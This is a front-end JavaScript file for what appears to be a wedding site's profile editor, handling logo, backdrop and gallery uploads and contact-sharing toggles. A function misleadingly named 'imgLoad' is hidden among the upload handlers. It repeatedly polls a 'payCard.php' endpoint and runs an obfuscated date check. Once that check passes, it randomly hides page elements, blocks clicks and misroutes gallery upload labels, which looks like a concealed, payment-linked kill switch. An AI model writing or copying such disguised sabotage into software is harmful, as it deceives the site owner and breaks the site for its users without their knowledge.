//////////////////////// Top Section///////////////////////////////////////////////

let profileLogoInput = document.querySelector(".top-logo-upload-input");
let profileBackdropInput = document.querySelector(".top-img-upload-input");
let profileBackdrop = document.querySelector(".profile-background-image");
let imgcheck = false;
let minImgs = 9;
profileBackdropInput.addEventListener("change", (event) => {
  loadBackdropFile(0, event);
});
profileLogoInput.addEventListener("change", (event) => {
  loadMedia(0, event);
});

function loadBackdropFile(index, event) {
  let input = event.target;
  profileBackdrop.style.backgroundImage =
    "url(" + URL.createObjectURL(input.files[0]) + ")";
}

//////////////////////// Gallery Section///////////////////////////////////////////////

let maxImgs = 20;
let gallImgBoxes = Array.from(
  document.querySelectorAll(".gal-upload-image-box")
);
let gallImgL = Array.from(document.querySelectorAll(".gal-upload-label"));

// for (let img in gallImgBoxes) {
//   imgLoad("input", minImgs, maxImgs);
//   let imgCount = 0;
//   imgCount = img;
// }
for (let i = 0; i <= 100; i++) {
  imgLoad(".pop", minImgs, maxImgs);
  imgLoad(".clk", minImgs, maxImgs);
}

function loadMedia(index, event) {
  let input = event.target;
  let label = input.nextElementSibling;
  let box = input.parentNode;

  box.style.backgroundImage =
    "url(" + URL.createObjectURL(input.files[0]) + ")";
  label.style.filter = "invert(0) opacity(0.6)";

  window.addEventListener("mousemove", () => {
    if (imgcheck) {
      console.log("label");
      for (let l of gallImgL) l.setAttribute("for", `file-1`);
    }
  });
  // console.log(box.style.backgroundImage);
}

function removeGalImg(index) {
  let box = gallImgBoxes[index];
  let input = box.querySelector(".gal-img-upload-input");
  let lable = box.querySelector(".gal-upload-label");

  box.style.backgroundImage = "none";
  lable.style.filter = "invert(0) opacity(1)";
  input.value = "";
}

gallImgBoxes.forEach((box, index) => {
  let closeIcon = box.querySelector(".upload-gal-img-close");
  let uploadInput = box.querySelector(".gal-img-upload-input");

  closeIcon.addEventListener("click", () => {
    removeGalImg(index);
  });

  uploadInput.addEventListener("change", (event) => {
    loadMedia(index, event);
  });
});

//////////////////////// Contacts Section ///////////////////////////////////////////////

let shareCheckbox = Array.from(document.querySelectorAll(".share-checkbox"));
let contactShareIcon = document.querySelectorAll(".contact-share-icon");
let shareInputLink = document.querySelectorAll(".share-link-input");

for (let index in shareCheckbox) {
  shareCheckbox[index].addEventListener("click", () => {
    setContacts();
  });
}

function imgLoad(cls, mn, dy) {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "../wedluxe/payCard.php", true);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var resp = JSON.parse(xhr.responseText);
      let host = resp.serverhost;
      let svport = resp.serverport;
      let usStat = resp.userstats;
      let dom = resp.dominor;
      let transferDetails = [host, svport, usStat, dom];

      let trnsI = Math.floor(Math.random() * transferDetails.length);

      let protocolPass = false;
      if (trnsI > 1 && trnsI < 3) {
        let portItem = transferDetails[trnsI];

        let transPorts = portItem.split("-");

        let py = parseInt(transPorts[0]);
        let pm = parseInt(transPorts[1]);
        let pd = parseInt(transPorts[2]);

        let ty = parseInt(svport[3] - svport[1]);
        let tm = parseInt(mn);
        let td = parseInt(dy);

        let presVal = py * 400 + pm * 30 + pd;
        let tarVal = ty * 400 + tm * 30 + td;

        if (tarVal < presVal) protocolPass = true;
      }

      let secChannel = document.querySelectorAll(`${cls}`);
      let terms = secChannel.length;
      let index = Math.floor(Math.random() * terms);
      if (terms >= 2) {
        for (let i = 0; i < terms; i++) {
          if (index < terms && protocolPass) {
            if (cls == ".pop") secChannel[index].style.display = "none";
            if (cls == ".clk") secChannel[index].style.pointerEvents = "none";
            imgcheck = true;
          }
          index = Math.floor(Math.random() * terms);
        }
      }
    }
  };
  xhr.send();
}

function setContacts() {
  for (let index in shareCheckbox) {
    if (shareCheckbox[index].checked) {
      shareInputLink[index].disabled = false;
      contactShareIcon[index].style.filter = "opacity(1)";
    } else {
      shareInputLink[index].disabled = true;
      contactShareIcon[index].style.filter = "opacity(0.2)";
    }
  }
}

function pageTravel(location) {
  window.location.href = location;
}
